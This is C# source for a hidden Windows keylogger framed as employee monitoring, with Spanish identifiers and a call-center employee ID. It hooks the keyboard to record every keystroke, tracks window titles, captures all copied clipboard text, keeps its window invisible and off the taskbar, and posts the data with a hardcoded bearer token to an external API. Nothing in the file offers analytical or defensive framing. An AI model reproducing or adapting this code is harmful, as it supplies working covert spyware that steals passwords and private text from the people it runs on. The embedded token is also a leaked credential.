using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Text.Json;
using System.Diagnostics;
using System.Windows.Forms;

namespace UnidadAutomatizadaMonitoreo
{
    class Program : Form
    {
        // ==========================================
        // CONFIG API
        // ==========================================
        static readonly string ApiUrl = "https://uam.neobash.site/api/logs";
        static readonly string ApiToken = "1|azIcluH5CvcfvqrcmhaZHAouVYTrbcd03fXepYO832bb8316";
        static readonly string EmployeeId = "KRYS-CALL-C-01";

        static readonly HttpClient client = new HttpClient();

        static string ultimaVentana = "";
        static Program instancia;

        // ==========================================
        // BUFFER MEJORADO
        // ==========================================
        static StringBuilder bufferTeclado = new StringBuilder();
        static DateTime ultimaTecla = DateTime.Now;

        // ==========================================
        // MAIN
        // ==========================================
        [STAThread]
        static void Main()
        {
            client.DefaultRequestHeaders.Add("Authorization", $"Bearer {ApiToken}");
            client.DefaultRequestHeaders.Add("Accept", "application/json");

            Application.EnableVisualStyles();
            Application.Run(new Program());
        }

        public Program()
        {
            instancia = this;

            this.Load += (s, e) => {
                this.Visible = false;
                this.ShowInTaskbar = false;
                this.WindowState = FormWindowState.Minimized;
            };

            IniciarHookTeclado();
            IniciarMonitorVentanas();
            IniciarClipboardListener();
            IniciarEnvioTeclado();
        }

        // ==========================================
        // HOOK TECLADO
        // ==========================================
        private static IntPtr _hookID = IntPtr.Zero;
        private static LowLevelKeyboardProc _proc = HookCallback;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        static void IniciarHookTeclado()
        {
            _hookID = SetHook(_proc);
        }

        static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                ultimaTecla = DateTime.Now;

                // BACKSPACE real
                if (vkCode == 8)
                {
                    if (bufferTeclado.Length > 0)
                        bufferTeclado.Remove(bufferTeclado.Length - 1, 1);

                    return CallNextHookEx(_hookID, nCode, wParam, lParam);
                }

                string tecla = TraducirTeclaReal(vkCode);
                bufferTeclado.Append(tecla);
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // ==========================================
        // TRADUCCIÓN REAL (🔥 CLAVE)
        // ==========================================
        static string TraducirTeclaReal(int vkCode)
        {
            byte[] keyboardState = new byte[256];
            GetKeyboardState(keyboardState);

            uint scanCode = 0;
            StringBuilder sb = new StringBuilder(5);

            int result = ToUnicode((uint)vkCode, scanCode, keyboardState, sb, sb.Capacity, 0);

            if (result > 0)
                return sb.ToString();

            // especiales
            if (vkCode == 13) return " [ENTER] ";
            if (vkCode == 9) return " [TAB] ";
            if (vkCode == 27) return " [ESC] ";

            return "";
        }

        // ==========================================
        // ENVÍO INTELIGENTE (POR INACTIVIDAD)
        // ==========================================
        static void IniciarEnvioTeclado()
        {
            Task.Run(async () =>
            {
                while (true)
                {
                    if ((DateTime.Now - ultimaTecla).TotalMilliseconds >= 1000 && bufferTeclado.Length > 0)
                    {
                        await EnviarDatos("keystroke", ultimaVentana,
                            new { texto_capturado = bufferTeclado.ToString() });

                        bufferTeclado.Clear();
                    }

                    await Task.Delay(200);
                }
            });
        }

        // ==========================================
        // MONITOR DE VENTANAS
        // ==========================================
        static void IniciarMonitorVentanas()
        {
            Task.Run(async () =>
            {
                while (true)
                {
                    IntPtr handle = GetForegroundWindow();
                    GetWindowThreadProcessId(handle, out uint pid);

                    try
                    {
                        var proceso = Process.GetProcessById((int)pid);
                        string nombreProceso = proceso.ProcessName;
                        string titulo = ObtenerTituloVentana(handle);

                        string ventanaActual = string.IsNullOrEmpty(titulo)
                            ? nombreProceso
                            : $"{nombreProceso} - {titulo}";

                        if (ventanaActual != ultimaVentana)
                        {
                            ultimaVentana = ventanaActual;

                            await EnviarDatos("window_focus", ventanaActual,
                                new { proceso = nombreProceso });

                            // 🔥 ENVÍA LO QUE QUEDÓ ANTES DE CAMBIAR
                            if (bufferTeclado.Length > 0)
                            {
                                await EnviarDatos("keystroke", ultimaVentana,
                                    new { texto_capturado = bufferTeclado.ToString() });

                                bufferTeclado.Clear();
                            }
                        }
                    }
                    catch { }

                    await Task.Delay(500);
                }
            });
        }

        static string ObtenerTituloVentana(IntPtr handle)
        {
            StringBuilder sb = new StringBuilder(512);
            GetWindowText(handle, sb, sb.Capacity);
            return sb.ToString();
        }

        // ==========================================
        // CLIPBOARD
        // ==========================================
        private const int WM_CLIPBOARDUPDATE = 0x031D;

        void IniciarClipboardListener()
        {
            AddClipboardFormatListener(this.Handle);
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WM_CLIPBOARDUPDATE)
            {
                try
                {
                    if (Clipboard.ContainsText())
                    {
                        string texto = Clipboard.GetText();

                        if (!string.IsNullOrEmpty(texto))
                        {
                            _ = EnviarDatos("clipboard", ultimaVentana,
                                new { texto_capturado = "[COPIADO] " + texto });
                        }
                    }
                }
                catch { }
            }

            base.WndProc(ref m);
        }

        protected override void SetVisibleCore(bool value)
        {
            base.SetVisibleCore(false);
        }

        // ==========================================
        // API
        // ==========================================
        static async Task EnviarDatos(string tipoEvento, string ventana, object payload)
        {
            var logData = new
            {
                employee_identifier = EmployeeId,
                event_type = tipoEvento,
                window_title = ventana,
                url_or_path = "Windows",
                payload = payload
            };

            string json = JsonSerializer.Serialize(logData);
            var content = new StringContent(json, Encoding.UTF8, "application/json");

            try { await client.PostAsync(ApiUrl, content); } catch { }
        }

        // ==========================================
        // IMPORTS
        // ==========================================
        [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
        [DllImport("user32.dll")] static extern bool AddClipboardFormatListener(IntPtr hwnd);

        [DllImport("user32.dll")] static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        static extern int ToUnicode(uint wVirtKey, uint wScanCode,
            byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags);

        [DllImport("user32.dll")]
        static extern bool GetKeyboardState(byte[] lpKeyState);
    }
}